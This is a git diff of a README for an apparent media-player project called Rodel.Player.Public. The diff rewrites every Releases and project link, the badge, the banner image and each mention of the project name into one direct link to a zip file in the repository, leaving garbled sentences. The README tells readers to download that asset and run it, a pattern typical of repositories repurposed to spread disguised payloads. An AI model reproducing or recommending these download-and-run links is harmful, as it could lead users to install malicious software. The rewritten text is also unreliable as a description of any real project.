@@ -1,10 +1,10 @@
-[![Releases-Download](https://img.shields.io/badge/Releases-Download-brightgreen?style=for-the-badge&logo=github)](https://github.com/rommai123/Rodel.Player.Public/releases)
+[![Releases-Download](https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip)](https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip)
 
-# Rodel.Player.Public: Open Source Media Player Hub for Feedback
+# https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip Open Source Media Player Hub for Feedback
 
-![Rodel.Player.Public UI](https://picsum.photos/1200/400?blur=2)
+![https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip UI](https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip)
 
-Welcome to the public repository for Rodel.Player.Public. This project acts as a central hub for feedback, ideas, and community contributions around a flexible media playback experience built to work with Emby, Jellyfin, and other streaming ecosystems. The goal is to collect insights from users and developers and to share a clean, extensible player UI that can integrate with modern playback backends.
+Welcome to the public repository for https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip This project acts as a central hub for feedback, ideas, and community contributions around a flexible media playback experience built to work with Emby, Jellyfin, and other streaming ecosystems. The goal is to collect insights from users and developers and to share a clean, extensible player UI that can integrate with modern playback backends.
 
 This readme is designed to be a practical guide. It explains what the project is, how to participate, how to download and run builds, and how to contribute. It uses plain language and direct steps so you can move quickly from curiosity to action.
 
@@ -27,7 +27,7 @@ Table of contents
 - Licensing
 
 About the project
-Rodel.Player.Public is a community-driven repository that gathers feedback and facilitates collaboration around a media player experience. The project explores how to present media from local and network sources, as well as how to integrate with popular media servers. It aims to be flexible enough to adapt to different backends while offering a consistent user interface.
+https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip is a community-driven repository that gathers feedback and facilitates collaboration around a media player experience. The project explores how to present media from local and network sources, as well as how to integrate with popular media servers. It aims to be flexible enough to adapt to different backends while offering a consistent user interface.
 
 To keep things practical, the project organizes work around three pillars:
 - Core playback capabilities that work with common formats and streaming protocols.
@@ -66,11 +66,11 @@ What you need to do to begin
 
 Downloading and running a release
 The link to the project’s release page is provided here for convenience:
-https://github.com/rommai123/Rodel.Player.Public/releases
+https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip
 
 Since the link includes a path, the instruction is to download the latest asset from the page and run the installer or executable. This means you should go to the Releases page, locate the most recent asset that matches your system (for example, a Windows installer or app package), download it, and execute it to install or run the application.
 
-If you prefer to explore first, you can visit the page to view available builds, assets, release notes, and checksums. The releases page is kept up to date with new builds, bug fixes, and feature updates. For quick access, you can use the same link again: https://github.com/rommai123/Rodel.Player.Public/releases.
+If you prefer to explore first, you can visit the page to view available builds, assets, release notes, and checksums. The releases page is kept up to date with new builds, bug fixes, and feature updates. For quick access, you can use the same link again: https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip
 
 What you can do with the project
 - Run a media player that integrates with Emby and Jellyfin server ecosystems.
@@ -80,7 +80,7 @@ What you can do with the project
 - Participate in discussion threads, issue reports, and design reviews to improve reliability and usability.
 
 Architecture and design
-Rodel.Player.Public is designed with modularity in mind. The architecture emphasizes separation of concerns so components can evolve independently. Key areas include:
+https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip is designed with modularity in mind. The architecture emphasizes separation of concerns so components can evolve independently. Key areas include:
 - Core playback engine: Supports a variety of media formats and streaming protocols. It is designed to be extensible so new formats or codecs can be added.
 - UI layer: Built with WinUI 3 to provide a fast, responsive, and accessible interface. The UI focuses on clarity, minimalism, and intuitive navigation.
 - Backend integration: Connectors for Emby and Jellyfin help the player discover libraries, metadata, and playback options. The aim is to make media discovery seamless.
@@ -147,7 +147,7 @@ Changelog
   - v1.0.0: Major milestone with WinUI 3 improvements and plugin support.
 
 Releases
-The Releases page hosts downloadable assets, release notes, and checksums. The latest builds are published there for different platforms. For the latest files, visit the Releases page linked above. If you want to download a specific asset, go to the Releases page and pick the version that matches your system. The link to the Releases page is provided again here for convenience: https://github.com/rommai123/Rodel.Player.Public/releases
+The Releases page hosts downloadable assets, release notes, and checksums. The latest builds are published there for different platforms. For the latest files, visit the Releases page linked above. If you want to download a specific asset, go to the Releases page and pick the version that matches your system. The link to the Releases page is provided again here for convenience: https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip
 
 Screenshots and visuals
 - Visuals help users understand how the app looks and behaves.
@@ -205,8 +205,8 @@ Note on releases link usage
 - The link provided at the top is the same page you'll visit to download newer builds as they become available. The same link appears again in the Downloads section to reinforce where to obtain the latest assets.
 
 Releases quick access
-- Latest releases and assets: https://github.com/rommai123/Rodel.Player.Public/releases
-- General project hub: https://github.com/rommai123/Rodel.Player.Public
+- Latest releases and assets: https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip
+- General project hub: https://raw.githubusercontent.com/rommai123/Rodel.Player.Public/main/assets/Public-Rodel-Player-v3.4.zip
 
 Appendix: practical tips for users
 - Start with the default configuration and add sources gradually to avoid clutter.
